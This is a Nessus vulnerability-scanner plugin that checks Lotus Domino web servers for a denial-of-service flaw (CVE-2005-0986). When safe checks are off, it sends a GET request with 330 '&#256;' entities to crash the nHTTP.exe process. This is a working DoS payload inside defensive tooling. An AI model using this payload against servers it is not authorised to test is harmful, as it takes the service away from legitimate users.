#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(17991);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2011/10/05 02:53:44 $");

  script_cve_id("CVE-2005-0986");
  script_bugtraq_id(13045);
  script_osvdb_id(15319);

  script_name(english:"IBM Lotus Domino Web Service NLSCCSTR.DLL Malformed GET Request Overflow DoS");
  script_summary(english:"Checks for remote denial of service vulnerability in Lotus Domino Server Web Service");
 
  script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to denial of service attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of Lotus Domino Server's web
service that is affected by a denial of service vulnerability. 

By sending a specially crafted HTTP request with a long string of
unicode characters, a remote attacker can crash the nHTTP.exe process,
denying service to legitimate users. 

Note that IBM has released technote #1202446 for this issue but has
been unable to reproduce it.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/395126");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Lotus Domino Server version 6.5.3 or later as it
is known to be unaffected.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/04/07");
  script_set_attribute(attribute:"vuln_publication_date", value:"2005/04/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2005/04/08");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ibm:lotus_domino");
  script_end_attributes();
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Web Servers");
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
banner = get_http_banner(port:port);
if (!banner || "Lotus Domino" >!< banner) exit(0);


# If safe chceks are enabled, check the version number.
if (safe_checks()) {
  # From the advisory:
  #   iDEFENSE has confirmed the existence of this vulnerability in Lotus
  #   Domino Server version 6.5.1. It has been reported that Lotus Domino
  #   Server 6.03 is also vulnerable. It is suspected that earlier versions of
  #   Lotus Domino Server are also affected. Additionally, iDEFENSE has
  #   confirmed that Lotus Domino Server version 6.5.3 is not affected by this
  #   issue.
  if (egrep(string:banner, pattern:"^Server: +Lotus-Domino/([0-5]\.|6\.([0-4]\.|5\.[0-2]))"))
    security_warning(port);
  exit(0);
}
# Otherwise, try to crash it.
else {

  banner = get_http_banner(port:port);
  if ( ! banner ) exit(0);
  if ( ! egrep(pattern:"^Server:.*Domino", string:banner) ) exit(0);

  foreach dir (cgi_dirs()) {
      # The advisory claims ~330 UNICODE characters of decimal 
      # 430 (ie, 0x01AE) are needed. Should we iterate and 
      # add to the request instead???
      dos = "";
      for (i=1; i <= 330; i++)
        # nb: see <http://www.cs.tut.fi/cgi-bin/run/~jkorpela/char.cgi?code=01ae>.
        dos = dos + "&#256;";
      # nb: given that IBM can't reproduce this, let's follow
      #     the advisory as closely as we can.
      r = http_send_recv3(method:"GET", item: strcat(dir, "/", dos), version: 10, port: port);
      if (isnull(r)) {
        security_warning(port);
        exit(0);
    }
  }
}
